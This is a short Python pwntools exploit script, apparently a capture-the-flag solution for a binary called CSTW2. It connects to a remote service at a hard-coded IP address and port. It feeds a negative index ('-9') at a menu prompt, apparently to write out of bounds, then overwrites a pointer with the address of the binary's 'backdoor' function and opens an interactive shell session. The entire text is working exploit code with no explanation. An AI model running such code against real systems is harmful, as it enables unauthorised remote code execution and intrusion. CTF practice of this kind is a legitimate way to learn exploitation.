from pwn import *
context.log_level = "debug"
p = remote("118.24.3.214" , 11000)
elf = ELF("./CSTW2")
for i in range(5):
	p.sendline("")
	p.recvline()
p.sendlineafter(">" , "-9")
p.sendafter(">" , p64(elf.symbols["backdoor"]))
p.interactive()